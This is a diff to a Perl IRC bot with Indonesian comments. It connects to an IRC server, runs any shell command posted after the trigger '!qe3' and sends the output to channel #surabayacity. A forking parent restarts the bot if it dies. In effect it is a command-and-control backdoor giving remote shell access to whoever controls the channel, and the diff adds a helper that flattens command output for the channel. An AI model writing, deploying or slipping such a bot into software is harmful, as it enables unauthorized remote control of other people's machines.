@@ -92,6 +92,13 @@ sub execute_command {
     return $output;
 }
 
+# Fungsi untuk mengirim pesan ke channel IRC
+sub send_to_channel {
+    my ($socket, $message) = @_;
+    $message =~ s/\r?\n/ | /g;  # Ganti newline dengan separator
+    print $socket "PRIVMSG #surabayacity :$message\r\n";
+}
+
 my $pid = fork();
 if (!defined $pid) {
     die "Cannot fork: $!";
@@ -100,20 +107,24 @@ if (!defined $pid) {
 if ($pid == 0) {
     # Ini adalah proses anak, jalankan proses utama Anda di sini
     my $socket = connect_to_irc();
-    while (1) {
-        my $input = <$socket>;
-        if (defined $input) {
-            print $input;  # Output dari server IRC
-            if ($input =~ /^PING(.*)$/i) {
-                print $socket "PONG$1\r\n";
-            } elsif ($input =~ /^:.* PRIVMSG .* :!qe3 (.*)$/i) {
-                my $command = $1;
-                my $result = execute_command($command);
-                my $response = "PRIVMSG #surabayacity :$result\r\n";
-                print $socket $response;
-            }
+
+    # Loop koneksi IRC
+    while (my $answer = <$socket>) {
+        # Tampilkan balasan server
+        print $answer;
+
+        # Balas permintaan ping (untuk menjaga koneksi tetap hidup)
+        if ($answer =~ m/^PING (.*?)$/gi) {
+            print "Replying with PONG ".$1."\n";
+            print $socket "PONG ".$1."\r\n";
         }
-        sleep(1);
+
+        # Mulai eksekusi perintah jika ada !qe3
+        if ($answer =~ /!qe3\s+(.*)/) {
+            my $command = $1;
+            my $result = execute_command($command);
+            send_to_channel($socket, $result);
+        }
     }
 } else {
     # Ini adalah proses induk, memantau proses anak
@@ -124,20 +135,24 @@ if ($pid == 0) {
             $pid = fork();
             if ($pid == 0) {
                 my $socket = connect_to_irc();
-                while (1) {
-                    my $input = <$socket>;
-                    if (defined $input) {
-                        print $input;
-                        if ($input =~ /^PING(.*)$/i) {
-                            print $socket "PONG$1\r\n";
-                        } elsif ($input =~ /^:.* PRIVMSG .* :!qe3 (.*)$/i) {
-                            my $command = $1;
-                            my $result = execute_command($command);
-                            my $response = "PRIVMSG #surabayacity :$result\r\n";
-                            print $socket $response;
-                        }
+
+                # Loop koneksi IRC
+                while (my $answer = <$socket>) {
+                    # Tampilkan balasan server
+                    print $answer;
+
+                    # Balas permintaan ping (untuk menjaga koneksi tetap hidup)
+                    if ($answer =~ m/^PING (.*?)$/gi) {
+                        print "Replying with PONG ".$1."\n";
+                        print $socket "PONG ".$1."\r\n";
                     }
-                    sleep(1);
+
+                    # Mulai eksekusi perintah jika ada !qe3
+                    if ($answer =~ /!qe3\s+(.*)/) {
+                        my $command = $1;
+                        my $result = execute_command($command);
+                        send_to_channel($socket, $result);
+                    }
                 }
             }
         }
